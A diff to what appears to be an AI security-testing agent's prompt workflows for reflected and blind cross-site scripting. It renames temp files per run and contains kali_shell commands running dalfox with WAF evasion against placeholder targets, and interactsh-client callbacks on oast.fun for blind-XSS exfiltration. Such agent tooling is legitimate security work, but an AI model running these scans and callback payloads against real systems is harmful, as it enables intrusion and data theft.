@@ -383,33 +383,35 @@ vice-versa -- let the grader's response, not your local render, decide which cel
 
 ONLY trigger if Steps 4-6 failed (payload reflected but encoded, or blocked by WAF). Run dalfox in the background since it can take several minutes:
 
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
+
 ```
-kali_shell({{"command": "dalfox url 'http://TARGET/path?param=test' --silence --waf-evasion --deep-domxss --mining-dom -o /tmp/dalfox.json --format json > /tmp/dalfox.log 2>&1 & echo $!"}})
+kali_shell({{"command": "dalfox url 'http://TARGET/path?param=test' --silence --waf-evasion --deep-domxss --mining-dom -o /tmp/dalfox-RUN.json --format json > /tmp/dalfox-RUN.log 2>&1 & echo $!"}})
 ```
 
 Save the PID. Poll progress:
 
 ```
-kali_shell({{"command": "tail -n 50 /tmp/dalfox.log"}})
+kali_shell({{"command": "tail -n 50 /tmp/dalfox-RUN.log"}})
 kali_shell({{"command": "ps -p SAVED_PID > /dev/null && echo RUNNING || echo DONE"}})
 ```
 
 When DONE, parse results:
 
 ```
-kali_shell({{"command": "cat /tmp/dalfox.json | jq -r '.[] | select(.type==\\"V\\") | .data'"}})
+kali_shell({{"command": "cat /tmp/dalfox-RUN.json | jq -r '.[] | select(.type==\\"V\\") | .data'"}})
 ```
 
 Each `type=V` entry is a verified working payload from dalfox. Take one and re-verify in Playwright (Step 6) for the captured-dialog proof.
 
 For POST data:
 ```
-dalfox url 'http://TARGET/submit' --data 'name=test&msg=test' --method POST --silence --waf-evasion -o /tmp/dalfox.json --format json
+dalfox url 'http://TARGET/submit' --data 'name=test&msg=test' --method POST --silence --waf-evasion -o /tmp/dalfox-RUN.json --format json
 ```
 
 For headers:
 ```
-dalfox url 'http://TARGET/path' -H 'Cookie: session=abc' --silence --waf-evasion -o /tmp/dalfox.json --format json
+dalfox url 'http://TARGET/path' -H 'Cookie: session=abc' --silence --waf-evasion -o /tmp/dalfox-RUN.json --format json
 ```
 
 ### Step 8: Prove impact
@@ -458,8 +460,10 @@ XSS_BLIND_WORKFLOW = """
 
 ### Step 1: Start interactsh-client as a background process
 
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
+
 ```
-kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
+kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh-RUN.log 2>&1 & echo $!"})
 ```
 
 **Save the PID** for later cleanup.
@@ -467,7 +471,7 @@ kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/inter
 ### Step 2: Read the registered callback domain
 
 ```
-kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
+kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh-RUN.log"})
 ```
 
 Look for a line containing the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`).
@@ -500,7 +504,7 @@ DNS-only exfil (when HTTP is blocked outbound):
 
 dalfox blind mode (auto-tests many payloads with the callback):
 ```
-kali_shell({"command": "dalfox url 'http://TARGET/path?param=test' -b REGISTERED_DOMAIN --silence -o /tmp/dalfox.json --format json"})
+kali_shell({"command": "dalfox url 'http://TARGET/path?param=test' -b REGISTERED_DOMAIN --silence -o /tmp/dalfox-RUN.json --format json"})
 ```
 
 ### Step 4: Submit payloads into stored fields
@@ -512,7 +516,7 @@ Submit via execute_curl or Playwright (multipart/form data). Then wait. Blind XS
 ### Step 5: Poll for callbacks
 
 ```
-kali_shell({"command": "tail -50 /tmp/interactsh.log"})
+kali_shell({"command": "tail -50 /tmp/interactsh-RUN.log"})
 ```
 
 Look for JSON lines with:
@@ -524,7 +528,7 @@ Look for JSON lines with:
 
 ```
 kali_shell({"command": "kill SAVED_PID"})
-kali_shell({"command": "rm /tmp/interactsh.log /tmp/dalfox.json /tmp/dalfox.log 2>/dev/null"})
+kali_shell({"command": "rm /tmp/interactsh-RUN.log /tmp/dalfox-RUN.json /tmp/dalfox-RUN.log 2>/dev/null"})
 ```
 """
 
